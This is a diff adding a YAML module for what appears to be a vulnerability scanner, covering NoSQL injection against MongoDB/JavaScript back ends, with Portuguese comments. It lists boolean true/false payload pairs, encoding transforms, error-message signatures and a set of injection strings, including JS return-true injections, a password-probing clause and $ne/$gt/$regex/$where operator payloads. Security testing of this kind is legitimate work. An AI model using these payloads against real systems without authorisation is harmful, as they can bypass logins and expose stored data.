@@ -1,0 +1,49 @@
+name: nosqli
+description: NoSQL Injection (MongoDB/JS) — operador, oráculo booleano e erro
+detectors: [signature, diff]
+diff_len_ratio: 0.30
+
+boolean_pairs:
+  - { true: "' || '1'=='1", false: "' || '1'=='2" }
+  - { true: "' && '1'=='1", false: "' && '1'=='2" }
+  - { true: "'||1||'", false: "'||0||'" }
+
+transforms:
+  - raw
+  - url
+  - case_random
+  - poly_mix
+
+signatures:
+  - "MongoError"
+  - "MongoServerError"
+  - "E11000"
+  - "\\$where"
+  - "\\$regex"
+  - "BSONError"
+  - "unexpected token"
+  - "SyntaxError:.*(function|near|token)"
+  - "Cannot read propert(y|ies) of"
+  - "MongoParseError"
+  - "com.mongodb"
+  - "PyMongo|pymongo"
+
+payloads:
+  # quebra de sintaxe / operador (contexto string)
+  - { value: "'", tags: [error] }
+  - { value: "\"", tags: [error] }
+  - { value: "';return 'a'=='a && ''=='", tags: [js, boolean] }
+  - { value: "'||'1'=='1", tags: [boolean] }
+  - { value: "\"||\"1\"==\"1", tags: [boolean] }
+  - { value: "' || 'a'='a", tags: [boolean] }
+  - { value: "'; return true; var _='", tags: [js, boolean] }
+  - { value: "';return(true);var a='", tags: [js, boolean] }
+  - { value: "' && this.password && '", tags: [js] }
+  - { value: "[$ne]=", tags: [operator] }
+  - { value: "[$gt]=", tags: [operator] }
+  - { value: "[$regex]=.*", tags: [operator] }
+  - { value: "{\"$ne\":null}", tags: [operator, json] }
+  - { value: "{\"$gt\":\"\"}", tags: [operator, json] }
+  - { value: "{\"$where\":\"1==1\"}", tags: [operator, json] }
+  # boolean falso (para diferencial)
+  - { value: "' && '1'=='2", tags: [boolean, false] }
